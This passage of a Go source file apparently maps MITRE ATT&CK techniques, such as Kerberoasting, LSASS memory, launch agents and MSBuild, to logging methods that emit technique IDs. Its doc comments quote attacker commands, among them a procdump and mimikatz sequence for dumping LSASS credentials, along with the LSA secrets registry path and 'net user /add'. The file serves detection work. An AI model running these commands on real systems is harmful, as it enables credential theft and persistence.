between two or more systems in a compromised environment. Many tools exist that
enable traffic redirection through proxies or port redirection, including HTRAN,
ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use
internal proxies to manage command and control communications inside a
compromised environment, to reduce the number of simultaneous outbound network
connections, to provide resiliency in the face of connection loss, or to ride
over existing trusted communications paths between infected systems to avoid
suspicion. Internal proxy connections may use common peer-to-peer (p2p)
networking protocols, such as SMB, to better blend in with the environment. By
using a compromised internal system as a proxy, adversaries may conceal the true
destination of C2 traffic while reducing the need for numerous connections to
external systems.
*/
func (g *Session) ATTACKEntInternalProxy(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1090.001").
        Msg("internal proxy")
}

/* ATTACKEntInternalSpearphishing Phases: lateral-movement

Adversaries may use internal spearphishing to gain access to additional
information or exploit other users within the same organization after they
already have access to accounts or systems within the environment. Internal
spearphishing is multi-staged attack where an email account is owned either by
controlling the user's device with previously installed malware or by
compromising the account credentials of the user. Adversaries attempt to take
advantage of a trusted internal account to increase the likelihood of tricking
the target into falling for the phish attempt.(Citation: Trend Micro When
Phishing Starts from the Inside 2017) Adversaries may leverage Spearphishing
Attachment or Spearphishing Link as part of internal spearphishing to deliver a
payload or redirect to an external site to capture credentials through Input
Capture on sites that mimic email login interfaces. There have been notable
incidents where internal spearphishing has been used. The Eye Pyramid campaign
used phishing emails with malicious attachments for lateral movement between
victims, compromising nearly 18,000 email accounts in the process.(Citation:
Trend Micro When Phishing Starts from the Inside 2017) The Syrian Electronic
Army (SEA) compromised email accounts at the Financial Times (FT) to steal
additional account credentials. Once FT learned of the attack and began warning
employees of the threat, the SEA sent phishing emails mimicking the Financial
Times IT department and were able to compromise even more users.(Citation: THE
FINANCIAL TIMES LTD 2019.)
*/
func (g *Session) ATTACKEntInternalSpearphishing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1534").
        Msg("internal spearphishing")
}

/* ATTACKEntInternetConnectionDiscovery Phases: discovery

Adversaries may check for Internet connectivity on compromised systems. This may
be performed during automated discovery and can be accomplished in numerous ways
such as using Ping, tracert, and GET requests to websites. Adversaries may use
the results and responses from these requests to determine if the system is
capable of communicating with their C2 servers before attempting to connect to
them. The results may also be used to identify routes, redirectors, and proxy
servers.
*/
func (g *Session) ATTACKEntInternetConnectionDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1016.001").
        Msg("internet connection discovery")
}

/* ATTACKEntInvalidCodeSignature Phases: defense-evasion

Adversaries may attempt to mimic features of valid code signatures to increase
the chance of deceiving a user, analyst, or tool. Code signing provides a level
of authenticity on a binary from the developer and a guarantee that the binary
has not been tampered with. Adversaries can copy the metadata and signature
information from a signed program, then use it as a template for an unsigned
program. Files with invalid code signatures will fail digital signature
validation checks, but they may appear more legitimate to users and security
tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)
Unlike Code Signing, this activity will not result in a valid signature.
*/
func (g *Session) ATTACKEntInvalidCodeSignature(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1036.001").
        Msg("invalid code signature")
}

/* ATTACKEntJavaScript Phases: execution

Adversaries may abuse various implementations of JavaScript for execution.
JavaScript (JS) is a platform-independent scripting language (compiled just-in-
time at runtime) commonly associated with scripts in webpages, though JS can be
executed in runtime environments outside the browser.(Citation: NodeJS) JScript
is the Microsoft implementation of the same scripting standard. JScript is
interpreted via the Windows Script engine and thus integrated with many
components of Windows such as the Component Object Model and Internet Explorer
HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft
JScript 2007)(Citation: Microsoft Windows Scripts) JavaScript for Automation
(JXA) is a macOS scripting language based on JavaScript, included as part of
Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10.
Apple’s OSA provides scripting capabilities to control applications, interface
with the operating system, and bridge access into the rest of Apple’s internal
APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript.
Scripts can be executed via the command line utility osascript, they can be
compiled into applications or script files via osacompile, and they can be
compiled and executed in memory of other programs by leveraging the OSAKit
Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA
2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow
Feb2021)(Citation: MDSec macOS JXA and VSCode) Adversaries may abuse various
implementations of JavaScript to execute various behaviors. Common uses include
hosting malicious scripts on websites as part of a Drive-by Compromise or
downloading and executing these script files as secondary payloads. Since these
payloads are text-based, it is also very common for adversaries to obfuscate
their content as part of Obfuscated Files or Information.
*/
func (g *Session) ATTACKEntJavaScript(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059.007").
        Msg("javascript")
}

/* ATTACKEntJunkData Phases: command-and-control

Adversaries may add junk data to protocols used for command and control to make
detection more difficult. By adding random or meaningless data to the protocols
used for command and control, adversaries can prevent trivial methods for
decoding, deciphering, or otherwise analyzing the traffic. Examples may include
appending/prepending data with junk characters or writing junk characters
between significant characters.
*/
func (g *Session) ATTACKEntJunkData(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1001.001").
        Msg("junk data")
}

/* ATTACKEntKerberoasting Phases: credential-access

Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff
network traffic to obtain a ticket-granting service (TGS) ticket that may be
vulnerable to Brute Force.(Citation: Empire InvokeKerberoast Oct 2016)(Citation:
AdSecurity Cracking Kerberos Dec 2015)  Service principal names (SPNs) are used
to uniquely identify each instance of a Windows service. To enable
authentication, Kerberos requires that SPNs be associated with at least one
service logon account (an account specifically tasked with running a
service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation:
Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov
2014)(Citation: Harmj0y Kerberoast Nov 2016) Adversaries possessing a valid
Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-
granting service (TGS) service tickets for any SPN from a domain controller
(DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking
Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4
algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account
associated with the SPN is used as the private key and is thus vulnerable to
offline Brute Force attacks that may expose plaintext credentials.(Citation:
AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct
2016) (Citation: Harmj0y Kerberoast Nov 2016) This same attack could be executed
using service tickets captured from network traffic.(Citation: AdSecurity
Cracking Kerberos Dec 2015) Cracked hashes may enable Persistence, Privilege
Escalation, and Lateral Movement via access to Valid Accounts.(Citation: SANS
Attacking Kerberos Nov 2014)
*/
func (g *Session) ATTACKEntKerberoasting(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1558.003").
        Msg("kerberoasting")
}

/* ATTACKEntKernelModulesandExtensions Phases: persistence privilege-escalation

Adversaries may modify the kernel to automatically execute programs on system
boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and
unloaded into the kernel upon demand. They extend the functionality of the
kernel without the need to reboot the system. For example, one type of module is
the device driver, which allows the kernel to access hardware connected to the
system. (Citation: Linux Kernel Programming)  When used maliciously, LKMs can be
a type of kernel-mode Rootkit that run with the highest operating system
privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Common
features of LKM based rootkits include: hiding itself, selective hiding of
files, processes and network activity, as well as log tampering, providing
authenticated backdoors and enabling root access to non-privileged users.
(Citation: iDefense Rootkit Overview) Kernel extensions, also called kext, are
used for macOS to load functionality onto a system similar to LKMs for Linux.
They are loaded and unloaded through kextload and kextunload commands. Since
macOS Catalina 10.15, kernel extensions have been deprecated on macOS
systems.(Citation: Apple Kernel Extension Deprecation) Adversaries can use LKMs
and kexts to covertly persist on a system and elevate privileges. Examples have
been found in the wild and there are some open source projects. (Citation:
Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub
Reptile) (Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco
Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken)(Citation:
Securelist Ventir) (Citation: Trend Micro Skidmap)
*/
func (g *Session) ATTACKEntKernelModulesandExtensions(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.006").
        Msg("kernel modules and extensions")
}

/* ATTACKEntKeychain Phases: credential-access

Adversaries may collect the keychain storage data from a system to acquire
credentials. Keychains are the built-in way for macOS to keep track of users'
passwords and credentials for many services and features such as WiFi passwords,
websites, secure notes, certificates, and Kerberos. Keychain files are located
in ~/Library/Keychains/,/Library/Keychains/, and /Network/Library/Keychains/.
(Citation: Wikipedia keychain) The security command-line utility, which is built
into macOS by default, provides a useful way to manage these credentials. To
manage their credentials, users have to use additional credentials to access
their keychain. If an adversary knows the credentials for the login keychain,
then they can get access to all the other credentials stored in this vault.
(Citation: External to DA, the OS X Way) By default, the passphrase for the
keychain is the user’s logon credentials.
*/
func (g *Session) ATTACKEntKeychain(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1555.001").
        Msg("keychain")
}

/* ATTACKEntKeylogging Phases: collection credential-access

Adversaries may log user keystrokes to intercept credentials as the user types
them. Keylogging is likely to be used to acquire credentials for new access
opportunities when OS Credential Dumping efforts are not effective, and may
require an adversary to intercept keystrokes on a system for a substantial
period of time before credentials can be successfully captured. Keylogging is
the most prevalent type of input capture, with many different ways of
intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods
include:  Hooking API callbacks used for processing keystrokes. Unlike
Credential API Hooking, this focuses solely on API functions intended for
processing keystroke data. Reading raw keystroke data from the hardware buffer.
Windows Registry modifications. Custom drivers. Modify System Image may provide
adversaries with hooks into the operating system of network devices to read raw
keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)
*/
func (g *Session) ATTACKEntKeylogging(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1056.001").
        Msg("keylogging")
}

/* ATTACKEntLC_LOAD_DYLIBAddition Phases: privilege-escalation persistence

Adversaries may establish persistence by executing malicious content triggered
by the execution of tainted binaries. Mach-O binaries have a series of headers
that are used to perform certain operations when a binary is loaded. The
LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic
libraries (dylibs) to load during execution time. These can be added ad-hoc to
the compiled binary as long as adjustments are made to the rest of the fields
and dependencies. (Citation: Writing Bad Malware for OSX) There are tools
available to perform these changes. Adversaries may modify Mach-O binary headers
to load and execute malicious dylibs every time the binary is executed. Although
any changes will invalidate digital signatures on binaries because the binary is
being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE
command from the binary so that the signature isn’t checked at load time.
(Citation: Malware Persistence on OS X)
*/
func (g *Session) ATTACKEntLC_LOAD_DYLIBAddition(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.006").
        Msg("lc_load_dylib addition")
}

/* ATTACKEntLC_MAINHijacking Phases: defense-evasion

This technique has been deprecated and should no longer be used. As of OS X
10.8, mach-O binaries introduced a new header called LC_MAIN that points to the
binary’s entry point for execution. Previously, there were two headers to
achieve this same effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX
Malware History). The entry point for a binary can be hijacked so that initial
execution flows to a malicious addition (either another section or a code cave)
and then goes back to the initial entry point so that the victim doesn’t know
anything was different  (Citation: Methods of Mac Malware Persistence). By
modifying a binary in this way, application whitelisting can be bypassed because
the file name or application path is still the same.
*/
func (g *Session) ATTACKEntLC_MAINHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1149").
        Msg("lc_main hijacking")
}

/* ATTACKEntLLMNRNBTNSPoisoningandSMBRelay Phases: credential-access collection

By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an
authoritative source for name resolution to force communication with an
adversary controlled system. This activity may be used to collect or relay
authentication materials.  Link-Local Multicast Name Resolution (LLMNR) and
NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as
alternate methods of host identification. LLMNR is based upon the Domain Name
System (DNS) format and allows hosts on the same local link to perform name
resolution for other hosts. NBT-NS identifies systems on a local network by
their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)
Adversaries can spoof an authoritative source for name resolution on a victim
network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they
know the identity of the requested host, effectively poisoning the service so
that the victims will communicate with the adversary controlled system. If the
requested host belongs to a resource that requires
identification/authentication, the username and NTLMv2 hash will then be sent to
the adversary controlled system. The adversary can then collect the hash
information sent over the wire through tools that monitor the ports for traffic
or through Network Sniffing and crack the hashes offline through Brute Force to
obtain the plaintext passwords. In some cases where an adversary has access to a
system that is in the authentication path between systems or when automated
scans that use credentials attempt to authenticate to an adversary controlled
system, the NTLMv2 hashes can be intercepted and relayed to access and execute
code against a target system. The relay step can happen in conjunction with
poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM
Relaying)(Citation: Secure Ideas SMB Relay) Several tools exist that can be used
to poison name services within local networks such as NBNSpoof, Metasploit, and
Responder. (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer)
(Citation: GitHub Responder)
*/
func (g *Session) ATTACKEntLLMNRNBTNSPoisoningandSMBRelay(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1557.001").
        Msg("llmnr/nbt-ns poisoning and smb relay")
}

/* ATTACKEntLSASecrets Phases: credential-access

Adversaries with SYSTEM access to a host may attempt to access Local Security
Authority (LSA) secrets, which can contain a variety of different credential
materials, such as credentials for service accounts.(Citation: Passcape LSA
Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows
Credentials) LSA secrets are stored in the registry at
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets. LSA secrets can also be dumped from
memory.(Citation: ired Dumping LSA Secrets) Reg can be used to extract from the
Registry. Mimikatz can be used to extract secrets from memory.(Citation: ired
Dumping LSA Secrets)
*/
func (g *Session) ATTACKEntLSASecrets(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003.004").
        Msg("lsa secrets")
}

/* ATTACKEntLSASSDriver Phases: persistence privilege-escalation

Adversaries may modify or add LSASS drivers to obtain persistence on compromised
systems. The Windows security subsystem is a set of components that manage and
enforce the security policy for a computer or domain. The Local Security
Authority (LSA) is the main component responsible for local security policy and
user authentication. The LSA includes multiple dynamic link libraries (DLLs)
associated with various other security functions, all of which run in the
context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation:
Microsoft Security Subsystem) Adversaries may target LSASS drivers to obtain
persistence. By either replacing or adding illegitimate drivers (e.g., Hijack
Execution Flow), an adversary can use LSA operations to continuously execute
malicious payloads.
*/
func (g *Session) ATTACKEntLSASSDriver(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.008").
        Msg("lsass driver")
}

/* ATTACKEntLSASSMemory Phases: credential-access

Adversaries may attempt to access credential material stored in the process
memory of the Local Security Authority Subsystem Service (LSASS). After a user
logs on, the system generates and stores a variety of credential materials in
LSASS process memory. These credential materials can be harvested by an
administrative user or SYSTEM and used to conduct Lateral Movement using Use
Alternate Authentication Material. As well as in-memory techniques, the LSASS
process memory can be dumped from the target host and analyzed on a local
system. For example, on the target host use procdump:  procdump -ma lsass.exe
lsass_dump  Locally, mimikatz can be run using:  sekurlsa::Minidump
lsassdump.dmp sekurlsa::logonPasswords  Windows Security Support Provider (SSP)
DLLs are loaded into LSSAS process at system start. Once loaded into the LSA,
SSP DLLs have access to encrypted and plaintext passwords that are stored in
Windows, such as any logged-on user's Domain password or smart card PINs. The
SSP configuration is stored in two Registry keys:
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An
adversary may modify these Registry keys to add new SSPs, which will be loaded
the next time the system boots, or when the AddSecurityPackage Windows API
function is called.(Citation: Graeber 2014) The following SSPs can be used to
access credentials:  Msv: Interactive logons, batch logons, and service logons
are done through the MSV authentication package. Wdigest: The Digest
Authentication protocol is designed for use with Hypertext Transfer Protocol
(HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation:
TechNet Blogs Credential Protection) Kerberos: Preferred for mutual client-
server domain authentication in Windows 2000 and later. CredSSP:  Provides SSO
and Network Level Authentication for Remote Desktop Services.(Citation: TechNet
Blogs Credential Protection)
*/
func (g *Session) ATTACKEntLSASSMemory(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003.001").
        Msg("lsass memory")
}

/* ATTACKEntLateralToolTransfer Phases: lateral-movement

Adversaries may transfer tools or other files between systems in a compromised
environment. Files may be copied from one system to another to stage adversary
tools or other files over the course of an operation. Adversaries may copy files
laterally between internal victim systems to support lateral movement using
inherent file sharing protocols such as file sharing over SMB to connected
network shares or with authenticated connections with SMB/Windows Admin Shares
or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with
native tools like scp, rsync, and sftp.
*/
func (g *Session) ATTACKEntLateralToolTransfer(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1570").
        Msg("lateral tool transfer")
}

/* ATTACKEntLaunchAgent Phases: persistence privilege-escalation

Adversaries may create or modify launch agents to repeatedly execute malicious
payloads as part of persistence. Per Apple’s developer documentation, when a
user logs in, a per-user launchd process is started which loads the parameters
for each launch-on-demand user agent from the property list (plist) files found
in /System/Library/LaunchAgents, /Library/LaunchAgents, and
$HOME/Library/LaunchAgents (Citation: AppleDocs Launch Agent Daemons) (Citation:
OSX Keydnap malware) (Citation: Antiquated Mac Malware). These launch agents
have property list files which point to the executables that will be launched
(Citation: OSX.Dok Malware). Adversaries may install a new launch agent that can
be configured to execute at login by using launchd or launchctl to load a plist
into the appropriate directories  (Citation: Sofacy Komplex Trojan)  (Citation:
Methods of Mac Malware Persistence). The agent name may be disguised by using a
name from a related operating system or benign software. Launch Agents are
created with user level privileges and are executed with the privileges of the
user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus
for OS X). They can be set up to execute when a specific user logs in (in the
specific user’s directory structure) or when any user logs in (which requires
administrator privileges).
*/
func (g *Session) ATTACKEntLaunchAgent(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1543.001").
        Msg("launch agent")
}

/* ATTACKEntLaunchDaemon Phases: persistence privilege-escalation

Adversaries may create or modify launch daemons to repeatedly execute malicious
payloads as part of persistence. Per Apple’s developer documentation, when macOS
and OS X boot up, launchd is run to finish system initialization. This process
loads the parameters for each launch-on-demand system-level daemon from the
property list (plist) files found in /System/Library/LaunchDaemons and
/Library/LaunchDaemons (Citation: AppleDocs Launch Agent Daemons). These
LaunchDaemons have property list files which point to the executables that will
be launched (Citation: Methods of Mac Malware Persistence).  Adversaries may
install a new launch daemon that can be configured to execute at startup by
using launchd or launchctl to load a plist into the appropriate directories
(Citation: OSX Malware Detection). The daemon name may be disguised by using a
name from a related operating system or benign software (Citation: WireLurker).
Launch Daemons may be created with administrator privileges, but are executed
under root privileges, so an adversary may also use a service to escalate
privileges from administrator to root.  The plist file permissions must be
root:wheel, but the script or program that it points to has no such requirement.
So, it is possible for poor configurations to allow an adversary to modify a
current Launch Daemon’s executable and gain persistence or Privilege Escalation.
*/
func (g *Session) ATTACKEntLaunchDaemon(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1543.004").
        Msg("launch daemon")
}

/* ATTACKEntLaunchctl Phases: execution

Adversaries may abuse launchctl to execute commands or programs. Launchctl
controls the macOS launchd process, which handles things like Launch Agents and
Launch Daemons, but can execute other commands or programs itself. Launchctl
supports taking subcommands on the command-line, interactively, or even
redirected from standard input.(Citation: Launchctl Man) By loading or reloading
Launch Agents or Launch Daemons, adversaries can install persistence or execute
changes they made.(Citation: Sofacy Komplex Trojan) Running a command from
launchctl is as simple as launchctl submit -l  -- /Path/to/thing/to/execute
"arg" "arg" "arg". Adversaries can abuse this functionality to execute code or
even bypass application control if launchctl is an allowed process.
*/
func (g *Session) ATTACKEntLaunchctl(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1569.001").
        Msg("launchctl")
}

/* ATTACKEntLaunchd Phases: execution persistence privilege-escalation

Adversaries may abuse the Launchd daemon to perform task scheduling for initial
or recurring execution of malicious code. The launchd daemon, native to macOS,
is responsible for loading and maintaining services within the operating system.
This process loads the parameters for each launch-on-demand system-level daemon
from the property list (plist) files found in /System/Library/LaunchDaemons and
/Library/LaunchDaemons (Citation: AppleDocs Launch Agent Daemons). These
LaunchDaemons have property list files which point to the executables that will
be launched (Citation: Methods of Mac Malware Persistence). An adversary may use
the launchd daemon in macOS environments to schedule new executables to run at
system startup or on a scheduled basis for persistence. launchd can also be
abused to run a process under the context of a specified account. Daemons, such
as launchd, run with the permissions of the root user account, and will operate
regardless of which user account is logged in.
*/
func (g *Session) ATTACKEntLaunchd(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1053.004").
        Msg("launchd")
}

/* ATTACKEntLinkTarget Phases: resource-development

Adversaries may put in place resources that are referenced by a link that can be
used during targeting. An adversary may rely upon a user clicking a malicious
link in order to divulge information (including credentials) or to gain
execution, as in Malicious Link. Links can be used for spearphishing, such as
sending an email accompanied by social engineering text to coax the user to
actively click or copy and paste a URL into a browser. Prior to a phish for
information (as in Spearphishing Link) or a phish to gain initial access to a
system (as in Spearphishing Link), an adversary must set up the resources for a
link target for the spearphishing link.  Typically, the resources for a link
target will be an HTML page that may include some client-side script such as
JavaScript to decide what content to serve to the user. Adversaries may clone
legitimate sites to serve as the link target, this can include cloning of login
pages of legitimate web services or organization login pages in an effort to
harvest credentials during Spearphishing Link.(Citation: Malwarebytes Silent
Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries
may also Upload Malware and have the link target point to malware for
download/execution by the user. Adversaries may purchase domains similar to
legitimate domains (ex: homoglyphs, typosquatting, different top-level domain,
etc.) during acquisition of infrastructure (Domains) to help facilitate
Malicious Link. Link shortening services can also be employed.
*/
func (g *Session) ATTACKEntLinkTarget(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1608.005").
        Msg("link target")
}

/* ATTACKEntLinuxandMacFileandDirectoryPermissionsModification Phases: defense-evasion

Adversaries may modify file or directory permissions/attributes to evade access
control lists (ACLs) and access protected files.(Citation: Hybrid Analysis
Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and
directory permissions are commonly managed by ACLs configured by the file or
directory owner, or users with the appropriate permissions. File and directory
ACL implementations vary by platform, but generally explicitly designate which
users or groups can perform which actions (read, write, execute, etc.). Most
Linux and Linux-based platforms provide a standard set of permission groups
(user, group, and other) and a standard set of permissions (read, write, and
execute) that are applied to each group. While nuances of each platform’s
permissions implementation may vary, most of the platforms provide two primary
commands used to manipulate file and directory ACLs: chown (short for change
owner), and chmod (short for change mode). Adversarial may use these commands to
make themselves the owner of files and directories or change the mode if current
permissions allow it. They could subsequently lock others out of the file.
Specific file and directory modifications may be a required step for many
techniques, such as establishing Persistence via Unix Shell Configuration
Modification or tainting/hijacking other instrumental binary/configuration files
via Hijack Execution Flow.
*/
func (g *Session) ATTACKEntLinuxandMacFileandDirectoryPermissionsModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1222.002").
        Msg("linux and mac file and directory permissions modification")
}

/* ATTACKEntLocalAccount Phases: persistence

Adversaries may create a local account to maintain access to victim systems.
Local accounts are those configured by an organization for use by users, remote
support, services, or for administration on a single system or service. With a
sufficient level of access, the net user /add command can be used to create a
local account. Such accounts may be used to establish secondary credentialed
access that do not require persistent remote access tools to be deployed on the
system.
*/
func (g *Session) ATTACKEntLocalAccount(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1136.001").
        Msg("local account")
}

/* ATTACKEntLocalAccount2 Phases: discovery

Adversaries may attempt to get a listing of local system accounts. This
information can help adversaries determine which local accounts exist on a
system to aid in follow-on behavior. Commands such as net user and net
localgroup of the Net utility and id and groupson macOS and Linux can list local
users and groups. On Linux, local users can also be enumerated through the use
of the /etc/passwd file.
*/
func (g *Session) ATTACKEntLocalAccount2(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1087.001").
        Msg("local account")
}

/* ATTACKEntLocalAccounts Phases: defense-evasion persistence privilege-escalation initial-access

Adversaries may obtain and abuse credentials of a local account as a means of
gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.
Local accounts are those configured by an organization for use by users, remote
support, services, or for administration on a single system or service. Local
Accounts may also be abused to elevate privileges and harvest credentials
through OS Credential Dumping. Password reuse may allow the abuse of local
accounts across a set of machines on a network for the purposes of Privilege
Escalation and Lateral Movement.
*/
func (g *Session) ATTACKEntLocalAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1078.003").
        Msg("local accounts")
}

/* ATTACKEntLocalDataStaging Phases: collection

Adversaries may stage collected data in a central location or directory on the
local system prior to Exfiltration. Data may be kept in separate files or
combined into one file through techniques such as Archive Collected Data.
Interactive command shells may be used, and common functionality within cmd and
bash may be used to copy data into a staging location.
*/
func (g *Session) ATTACKEntLocalDataStaging(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1074.001").
        Msg("local data staging")
}

/* ATTACKEntLocalEmailCollection Phases: collection

Adversaries may target user email on local systems to collect sensitive
information. Files containing email data can be acquired from a user’s local
system, such as Outlook storage or cache files. Outlook stores data locally in
offline data files with an extension of .ost. Outlook 2010 and later supports
.ost file sizes up to 50GB, while earlier versions of Outlook support up to
20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier)
and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP
accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data
files are typically stored in C:\Users\<username>\Documents\Outlook Files or
C:\Users\<username>\AppData\Local\Microsoft\Outlook.(Citation: Microsoft Outlook
Files)
*/
func (g *Session) ATTACKEntLocalEmailCollection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1114.001").
        Msg("local email collection")
}

/* ATTACKEntLocalGroups Phases: discovery

Adversaries may attempt to find local system groups and permission settings. The
knowledge of local system permission groups can help adversaries determine which
groups exist and which users belong to a particular group. Adversaries may use
this information to determine which users have elevated permissions, such as the
users found within the local administrators group. Commands such as net
localgroup of the Net utility, dscl . -list /Groups on macOS, and groups on
Linux can list local groups.
*/
func (g *Session) ATTACKEntLocalGroups(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1069.001").
        Msg("local groups")
}

/* ATTACKEntLogonScriptMac Phases: persistence privilege-escalation

Adversaries may use macOS logon scripts automatically executed at logon
initialization to establish persistence. macOS allows logon scripts (known as
login hooks) to be executed whenever a specific user logs into a system. A login
hook tells Mac OS X to execute a certain script when a user logs in, but unlike
Startup Items, a login hook executes as the elevated root user.(Citation:
creating login hook) Adversaries may use these login hooks to maintain
persistence on a single system.(Citation: S1 macOs Persistence) Access to login
hook scripts may allow an adversary to insert additional malicious code. There
can only be one login hook at a time though and depending on the access
configuration of the hooks, either local credentials or an administrator account
may be necessary.
*/
func (g *Session) ATTACKEntLogonScriptMac(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1037.002").
        Msg("logon script (mac)")
}

/* ATTACKEntLogonScriptWindows Phases: persistence privilege-escalation

Adversaries may use Windows logon scripts automatically executed at logon
initialization to establish persistence. Windows allows logon scripts to be run
whenever a specific user or group of users log into a system.(Citation: TechNet
Logon Scripts) This is done via adding a path to a script to the
HKCU\Environment\UserInitMprLogonScript Registry key.(Citation: Hexacorn Logon
Scripts) Adversaries may use these scripts to maintain persistence on a single
system. Depending on the access configuration of the logon scripts, either local
credentials or an administrator account may be necessary.
*/
func (g *Session) ATTACKEntLogonScriptWindows(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1037.001").
        Msg("logon script (windows)")
}

/* ATTACKEntMSBuild Phases: defense-evasion

Adversaries may use MSBuild to proxy execution of code through a trusted Windows
utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used
by Visual Studio. It handles XML formatted project files that define
requirements for loading and building various platforms and
configurations.(Citation: MSDN MSBuild) Adversaries can abuse MSBuild to proxy
execution of malicious code. The inline task capability of MSBuild that was
introduced in .NET version 4 allows for C# or Visual Basic code to be inserted
into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild
Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe
is a signed Microsoft binary, so when it is used this way it can execute
arbitrary code and bypass application control defenses that are configured to
allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)
*/
func (g *Session) ATTACKEntMSBuild(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1127.001").
        Msg("msbuild")
}

/* ATTACKEntMailProtocols Phases: command-and-control

Adversaries may communicate using application layer protocols associated with
electronic mail delivery to avoid detection/network filtering by blending in
with existing traffic. Commands to the remote system, and often the results of
those commands, will be embedded within the protocol traffic between the client
and server.  Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic
mail may be very common in environments.  Packets produced from these protocols
may have many fields and headers in which data can be concealed. Data could also
be concealed within the email messages themselves. An adversary may abuse these
protocols to communicate with systems under their control within a victim
network while also mimicking normal, expected traffic.
*/
func (g *Session) ATTACKEntMailProtocols(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1071.003").
        Msg("mail protocols")
}

/* ATTACKEntMakeandImpersonateToken Phases: defense-evasion privilege-escalation

Adversaries may make and impersonate tokens to escalate privileges and bypass
access controls. If an adversary has a username and password but the user is not
